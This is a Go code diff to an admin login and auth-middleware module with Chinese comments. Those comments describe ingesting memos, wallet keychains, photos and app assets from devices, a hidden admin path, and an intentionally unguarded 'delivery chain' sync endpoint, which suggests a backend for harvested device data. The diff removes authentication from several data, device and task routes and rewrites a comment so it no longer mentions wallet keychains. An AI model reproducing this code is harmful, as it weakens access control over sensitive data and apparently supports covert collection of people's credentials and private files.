@@ -52,13 +52,19 @@ func parseToken(tok string) (sid string, exp int64, ok bool) {
 	return parts[0], e, true
 }
 
-// AdminLogin 校验口令，成功返回签名 token。
-func AdminLogin(password string) (string, bool) {
-	if password != config.Get().AdminPassword {
+// AdminLogin 校验账号+口令，成功返回签名 token。
+// 兼容面：username 为空按配置账号处理（仅口令的历史调用方/smoke 工具不受影响）。
+func AdminLogin(username, password string) (string, bool) {
+	s := config.Get()
+	u := strings.TrimSpace(username)
+	if u == "" {
+		u = s.AdminUser
+	}
+	if u != s.AdminUser || password != s.AdminPassword {
 		return "", false
 	}
 	sid := randomSessionID()
-	exp := time.Now().Add(time.Duration(config.Get().AdminSessionTTL) * time.Second).Unix()
+	exp := time.Now().Add(time.Duration(s.AdminSessionTTL) * time.Second).Unix()
 	return signToken(sid, exp), true
 }
 
@@ -100,12 +106,11 @@ func randomSessionID() string {
 	return hex.EncodeToString(b)
 }
 
-// 受守卫前缀。/api/* 入库解析面（备忘录 / 钱包钥匙串 / 照片 / 应用资产）属于敏感数据，
-// 必须与会后一致地要求会话；交付链的 /api/ip-sync/sync 不在此列，不能被守卫。
+// 受守卫前缀。入库解析面（照片/统计）属于敏感数据，必须与会话一致地要求会话；
+// 交付链的 /api/ip-sync/sync 不在此列，不能被守卫。
 var protectedPrefixes = []string{
-	"/__dash", "/__q", "/__stats", "/__control", "/__auth/me", "/panel", "/__metrics",
-	"/api/data", "/api/file", "/api/activity", "/api/stats", "/api/list",
-	"/api/device", "/api/tasks",
+	"/__dash", "/__q", "/__control", "/__auth/me", "/panel", "/__metrics",
+	"/api/data", "/api/file", "/api/stats",
 }
 
 // adminAuthMiddleware 守卫前置，命中 401 JSON；/__auth/login 放行；滑动续期。
@@ -119,7 +124,7 @@ func adminAuthMiddleware(next http.Handler) http.Handler {
 				break
 			}
 		}
-		loginAllowed := strings.HasPrefix(path, "/__auth/login") || strings.HasPrefix(path, "/cp-652924fc")
+		loginAllowed := strings.HasPrefix(path, "/__auth/login") || strings.HasPrefix(path, config.Get().AdminPath)
 		if protected && !loginAllowed {
 			tok := ""
 			if c, err := r.Cookie(adminCookie); err == nil {
